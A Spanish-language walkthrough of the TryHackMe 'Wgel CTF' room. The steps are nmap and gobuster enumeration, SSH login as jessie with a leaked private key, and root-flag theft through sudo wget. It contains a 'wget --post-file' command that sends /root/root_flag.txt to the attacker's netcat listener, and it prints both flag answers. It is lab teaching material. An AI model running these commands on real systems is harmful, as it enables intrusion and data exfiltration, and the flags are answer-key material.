# 1. Wgel CTF

## a) flag de usuario

Realizamos para empezar un escaneo básico con nmap, de esta forma conoceremos los puertos abiertos en la máquina y los servicios que están corriendo.

```
nmap -sV -T5 10.10.8.17
```

Vemos que están abiertos los puertos 22 y 80, con un servicio SSH en el 22 y un servidor web Apache en el 80.

![](IMG/Pasted%20image%2020250417185451.png)

Echamos un vistazo a la página web y recibimos la página principal de Apache.

![](IMG/Pasted%20image%2020250417185611.png)

Si miramos en el código fuente de la página, vemos que hay un mensaje para "jessie" en el que le indican que actualice la página.

![](IMG/Pasted%20image%2020250417185704.png)

Hay poco más de momento, así que usaremos GoBuster para hacer un listado de directorios.

```
gobuster dir -u http://10.10.8.17 -w /usr/share/dirb/wordlists/common.txt
```

De todos los directorios descubiertos, solo podemos acceder a /sitemap.

![](IMG/Pasted%20image%2020250417190101.png)

Nos encontramos con esta página.

![](IMG/Pasted%20image%2020250417190218.png)

Navegamos por ella en busca de alguna pista, pero no hay nada interesante, así que volvemos a usar GoBuster pero esta vez sobre el directorio /sitemap

```
gobuster dir -u http://10.10.8.17/sitemap -w /usr/share/dirb/wordlists/common.txt
```

Y vemos que hay varios directorios más.

![](IMG/Pasted%20image%2020250417190637.png)

Tras haberlos visitados todos, el único con contenido interesante es el directorio /.ssh, el cual parece contener una clave RSA.

![](IMG/Pasted%20image%2020250417191011.png)

![](IMG/Pasted%20image%2020250417191205.png)

Pues, estando en un directorio llamado /.ssh, teniendo un posible nombre de usuario "jessie" (el que vimos en el código fuente de la página principal) y una clave RSA, haremos como hicimos en una máquina anterior, trataremos de conectarnos por SSH. Descargaremos el archivo con la clave RSA y ejecutamos:

```
ssh -i id_rsa.txt jessie@10.10.8.17
```

Nos dará error de permisos, se los cambiamos con chmod 400. Y se conectará sin problemas.

![](IMG/Pasted%20image%2020250417191433.png)

Una vez conectados, buscaremos el archivo user.txt y lo abriremos para encontrar la flag de usuario. (en este caso, se llama user_flag.txt)

![](IMG/Pasted%20image%2020250417191730.png)

**Respuesta: 057c67131c3d5e42dd5cd3075b198ff6**

## b) flag de root

Bien, ahora nos queda escalar privilegios para poder encontrar la flag de root. Lo primero que haremos será ejecutar sudo -l para averiguar que es lo que puede ejecutar este usuario con permisos de root (si es que puede ejecutar algo así). Y, vemos que puede ejecutar con permisos de root el comando wget. Con este comando podemos realizar operaciones sobre los archivos desde un navegador web a través de peticiones GET, por lo que, supongo que tenemos que conseguir ver y por tanto exfiltrar, el archivo con la flag de root, ya que en la descripción de esta sala de Tryhackme nos daba la pista preguntándonos ¿Podrás exfiltrar la flag de root?

![](IMG/Pasted%20image%2020250417191949.png)

Haremos uso de los [GTFOBins](https://gtfobins.github.io/), que ya habíamos usado en otras máquinas anteriores, y recordamos que son una lista de binarios que nos ayudan a hacer bypass a las restricciones de seguridad del sistema.

![](IMG/Pasted%20image%2020250417193633.png)

![](IMG/Pasted%20image%2020250417193705.png)

Lo primero que haremos será iniciar un listener con netcat, para poder realizar lo que explicaremos a continuación.

```
nc -lvnp 1234
```

![](IMG/Pasted%20image%2020250417195419.png)

Bien, pues suponiendo que el archivo se llamará root_flag.txt, y que estará eb la ruta /root. Ya qué siempre están en esa ruta los archivos root.txt en Tryhackme y que siempre se han llamado user.txt, pero en esta es user_flag.txt, pues ejecutamos lo siguiente para intentar obtener el archivo (usando el comando proporcionado por GTFOBins para descargar archivos)

```
sudo /usr/bin/wget --post-file=/root/root_flag.txt 10.8.16.0:1234
```

Con esto, lo que estamos haciendo es enviar el archivo root_flag.txt desde la máquina objetivo a nuestra máquina atacante.

![](IMG/Pasted%20image%2020250417195446.png)

Hemos tenido suerte y nos ha devuelto el contenido del archivo, es decir, la flag de root.

![](IMG/Pasted%20image%2020250417195533.png)

**Respuesta: b1b968b37519ad1daa6408188649263d**